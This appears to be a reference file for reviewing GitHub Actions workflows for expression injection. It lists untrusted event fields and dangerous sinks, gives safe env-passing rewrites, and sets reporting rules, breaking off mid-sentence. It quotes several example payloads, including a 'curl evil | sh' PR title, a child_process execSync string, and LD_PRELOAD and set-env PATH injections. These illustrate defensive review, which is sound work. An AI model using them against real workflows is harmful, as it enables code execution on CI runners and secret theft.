<!--
  Generated initially from spec.yaml; durable after that. Edit this
  reference directly to improve domain depth. Skillet regenerates
  only missing reference files.
-->

# Expression injection sinks and safe-passing patterns

## When to use

Load this reference when reviewing `run:` steps, composite shell steps, `actions/github-script` / `actions/script` inline-JS bodies, or steps that write to `$GITHUB_OUTPUT`, `$GITHUB_ENV`, `$GITHUB_PATH`, or `$GITHUB_STEP_SUMMARY`, *and* the templated value can come from an event field, free-form input, ref, title, body, label, or commit message.

## Contents

1. Why GHA expressions are injectable
2. Attacker-controlled fields (the source list)
3. Sinks where `${{ ... }}` is dangerous
4. Sinks where `${{ ... }}` is acceptable
5. Bad → safe rewrite recipes
6. Workflow-command file injection (`$GITHUB_OUTPUT`, `$GITHUB_ENV`, etc.)
7. `actions/github-script` and inline-JS sinks
8. Composite actions and reusable workflows
9. Required exploit chain to report
10. False-positive traps

---

## 1. Why GHA expressions are injectable

`${{ <expr> }}` is expanded by the runner **before** the shell or script body is constructed. The result is pasted as literal text into the YAML scalar, then handed to `bash`, `pwsh`, `node`, etc. There is no shell quoting, no escaping, and no type coercion. A PR title of `"; curl evil | sh; #` becomes a real command tail in the rendered script.

This is structurally different from environment variables: `$VAR` is parsed by the shell *after* command parsing, so a quoted `"$VAR"` cannot break out into command position.

Implication: **any** interpolation of attacker-controlled text into a shell or interpreter sink is injection, regardless of how "safe" the value looks at review time.

---

## 2. Attacker-controlled fields (the source list)

Treat as untrusted in any privileged context:

| Field | Notes |
|---|---|
| `github.event.pull_request.title` | Free text, multi-line possible |
| `github.event.pull_request.body` | Free text, multi-line |
| `github.event.pull_request.head.ref` | Branch name; `/`, `;`, backticks allowed in some clients |
| `github.event.pull_request.head.label` | `owner:branch` form |
| `github.event.pull_request.head.repo.*` | Fork metadata, attacker-owned |
| `github.head_ref` | Same as head ref |
| `github.event.issue.title` / `.body` | |
| `github.event.comment.body` | Issue, PR review, review comment, discussion comment |
| `github.event.review.body` | |
| `github.event.discussion.title` / `.body` | |
| `github.event.label.name` / `.description` | |
| `github.event.commits[*].message` | Commit messages on `push` from contributors |
| `github.event.commits[*].author.email` / `.name` | |
| `github.event.head_commit.message` | |
| `github.event.workflow_run.head_branch` | Upstream run from a fork |
| `github.event.workflow_run.head_commit.message` | |
| `github.event.inputs.*` (free-form) | `string` inputs to `workflow_dispatch` / `workflow_call` from less-trusted callers |
| `inputs.*` in reusable workflows | Caller-controlled |
| Artifact / cache contents | Filenames, env files, anything under attacker control upstream |

Trusted (in their literal form, not contents they may carry):

- `github.actor`, `github.repository`, `github.sha`, `github.run_id`, `github.workflow`
- `secrets.*` (but exposing them via interpolation creates a different problem)
- `github.event.inputs.*` where the input is `type: choice` or `type: boolean` with a closed enum

---

## 3. Sinks where `${{ ... }}` is dangerous

| Sink | Why |
|---|---|
| `run:` body (any shell) | Direct shell injection |
| `shell: bash` / `pwsh` / `python` / `node {0}` `run:` | Same; some shells have additional metachars |
| Composite action `runs.steps[*].run` | Same as workflow `run:` |
| `actions/github-script` `script:` | JS string-literal injection → `eval`-equivalent |
| `actions/script` `script:` | Same |
| Any third-party action input documented as "evaluated" or that ends up in `eval`/`exec` | Read the action's source to confirm |
| Arguments built from interpolation passed into `bash -c "..."` / `pwsh -Command "..."` | The outer quoting is consumed before the inner shell runs |
| Heredocs whose terminator is interpolated | `<<EOF$INJECT` breaks framing |
| `working-directory:` interpolated with untrusted ref | Path traversal / command-name confusion is rare but possible |

---

## 4. Sinks where `${{ ... }}` is acceptable

- `if:` conditions — expressions are evaluated, not shell-rendered. `if: github.event.pull_request.user.login == 'octocat'` is fine.
- `with:` inputs to actions that the action source treats as data (not as code). Verify by reading the action.
- `env:` mappings — the value becomes an environment variable; the shell sees `$VAR`, not the literal text.
- `name:` of jobs/steps (cosmetic; renders in UI, but does not execute).

The pattern: **expressions used as data values are fine; expressions concatenated into executable text are not.**

---

## 5. Bad → safe rewrite recipes

### Shell `run:`

Bad:
```yaml
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

Safe:
```yaml
- run: echo "Title: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

Required details:

- Quote the variable: `"$TITLE"`, not `$TITLE`. Otherwise word-splitting and glob expansion still occur (low-severity but a real bug).
- For `pwsh`, use `$env:TITLE` and prefer single-quoted literals where the value is interpolated by the shell, not the runner.
- Do **not** "fix" by piping through `printf` of an interpolated value — `printf "${{ x }}"` is still injectable.

### Multi-step value reuse

Bad:
```yaml
- id: meta
  run: echo "branch=${{ github.head_ref }}" >> "$GITHUB_OUTPUT"
- run: git checkout ${{ steps.meta.outputs.branch }}
```

Safe:
```yaml
- run: git checkout -- "$BRANCH"
  env:
    BRANCH: ${{ github.head_ref }}
```
Or, if the output must flow through a step output, sanitize and validate (regex anchor) before re-use, and still pass via `env:` at the consumer.

### Conditional gating, not interpolation

Where the only purpose is to branch on equality, use `if:` rather than echoing into a script:

```yaml
- if: github.event.pull_request.user.login == 'dependabot[bot]'
  run: ./scripts/update.sh
```

---

## 6. Workflow-command file injection

Steps that append untrusted text to `$GITHUB_OUTPUT`, `$GITHUB_ENV`, `$GITHUB_PATH`, or `$GITHUB_STEP_SUMMARY` create a second-order injection: a later privileged step reads a forged output, env var, or PATH entry.

### `$GITHUB_ENV` / `$GITHUB_OUTPUT`

Bad:
```yaml
- run: echo "msg=${{ github.event.issue.title }}" >> "$GITHUB_OUTPUT"
```

If the title is `foo\nLD_PRELOAD=/tmp/x.so`, the env file gains an extra entry.

Safe (heredoc with a random delimiter, value passed via env):
```yaml
- env:
    TITLE: ${{ github.event.issue.title }}
  run: |
    {
      echo "msg<<__EOF_$(uuidgen)__"
      printf '%s\n' "$TITLE"
      echo "__EOF_$(uuidgen)__"
    } >> "$GITHUB_OUTPUT"
```

Stable form: use a fixed long random delimiter chosen at workflow-author time, e.g. `EOF_8b3c…`. The point is that the delimiter must not appear in attacker content; a UUID per run achieves that.

Even safer: don't propagate untrusted text through outputs at all. Compute it where you need it and pass via `env:`.

### `$GITHUB_PATH`

Never write attacker-controlled text to `$GITHUB_PATH`. A line like `/tmp/attacker/bin` prepends to PATH for all subsequent steps in the job. Treat any interpolation here as critical.

### `$GITHUB_STEP_SUMMARY`

Renders as Markdown, not shell. Not RCE, but:

- Can include HTML in some renderers — XSS-like effects in the Actions UI.
- Can be used to spoof status (low severity).

Flag only if the summary content is later parsed by another tool as code or config.

### Legacy `::set-output` / `::set-env`

Deprecated and disabled by default, but if `ACTIONS_ALLOW_UNSECURE_COMMANDS=true` is set or the runner is old:

```
::set-env name=FOO::value
```

A line of attacker text containing `::set-env name=PATH::/tmp/evil` injected into stdout of a tool whose output is captured creates env injection. Flag any step that prints untrusted text while unsafe commands are enabled.

---

## 7. `actions/github-script` and inline-JS sinks

`actions/github-script` templates `${{ ... }}` into the JS source before execution.

Bad:
```yaml
- uses: actions/github-script@v7
  with:
    script: |
      const title = "${{ github.event.pull_request.title }}";
      core.info(title);
```

A title of `"; require('child_process').execSync('curl ...'); //` runs.

Safe:
```yaml
- uses: actions/github-script@v7
  env:
    TITLE: ${{ github.event.pull_request.title }}
  with:
    script: |
      const title = process.env.TITLE;
      core.info(title);
```

Same rule for any third-party action whose `script:` / `code:` / `expression:` input is documented as evaluated. When in doubt, read the action source for `eval`, `new Function`, `vm.runIn*`, `child_process`, or template-string composition.

---

## 8. Composite actions and reusable workflows

Resolve `uses: ./.github/actions/foo` and `uses: ./.github/workflows/bar.yml` and review their `run:` and `script:` sinks the same way. Two extra rules:

- **Composite action inputs** appear as `${{ inputs.x }}` inside the action's `run:`. If a caller passes attacker-controlled data into that input, the composite is the sink.
- **Reusable workflow inputs** appear as `${{ inputs.x }}` inside the callee. The callee may look safe in isolation but be exploitable when a public-trigger caller forwards untrusted data. Always check both sides.

Pattern to flag: a composite action's `action.yml` interpolates `${{ inputs.message }}` into `run:`, and any caller passes `${{ github.event.pull_request.title }}` to that input.

---

## 9. Required exploit chain to report

Every injection finding must state, explicitly:

1. **Entry point** — the trigger and the field name (`pull_request_target` → `github.event.pull_request.title`).
2. **Trust label** — untrusted (external PR), caller-controlled (reusable input), or trusted-but-hardenable.
3. **Path** — through which step outputs / env writes / artifact reads the value flows, if any.
4. **Sink** — exact file, step id, and line of the `run:` / `script:` / `$GITHUB_*` write.
5. **Privilege at sink** — `permissions:` block, secrets in scope, write token, OIDC, self-hosted runner.
6. **Impact** — RCE on runner, secret exfiltration, repo write, publish, etc. (calibrated by privilege).
7. **Fix** — env-passing snippet specific to this sink.

If you cannot fill in all seven, do not report. "This looks like injection" without a traced privilege path is the dominant false-positive shape.

---

## 10. False-positive traps

- **`type: choice` / `type: boolean` inputs.** A closed enum of shell-safe tokens (e.g. `staging|production`) cannot carry metacharacters. Interpolating them into `run:` is hardening-grade, not RCE. Flag only if the enum values themselves contain shell metacharacters or if the value is later concatenated into a different sink with different rules.
- **`workflow_dispatch` with free-form `string` inputs.** Manual dispatch is maintainer-only by default. Report as caller-controlled hardening unless there is an external invocation route (a public chatops job dispatches it, a less-trusted reusable caller forwards into it).
- **`github.actor`, `github.repository`, `github.sha`.** GitHub-controlled, alphanumeric/limited charset. Not injectable in practice. Do not report unless a specific bypass is demonstrated.
- **Interpolation in `if:` conditions.** Evaluated as expressions, not shell-rendered. Not a sink.
- **Interpolation in `env:` values.** The value lands in an env var; the consuming step still has to use it safely. The injection sink is the consumer's `run:`, not the `env:` mapping. Report at the consumer.
- **Interpolation in `with:` inputs to a known-safe action.** Confirm by reading the action's source. `actions/checkout`'s `ref` input, for example, is passed to `git` as an argument vector, not a shell string — it is not a shell-injection sink (though it is a checkout-of-PR-head concern, which is a different finding class).
- **`echo "${{ x }}"` where `x` is something like `github.run_id`.** Trusted source, not injectable. Do not report.
- **Pre-sanitized values.** If a prior step validates the value with an anchored regex (`^[a-zA-Z0-9._-]+$`) and exits non-zero on mismatch, downstream interpolation is not exploitable. Verify the regex is anchored on both ends and the step actually fails closed. An unanchored or non-failing check does not count.
- **Markdown rendering in `$GITHUB_STEP_SU
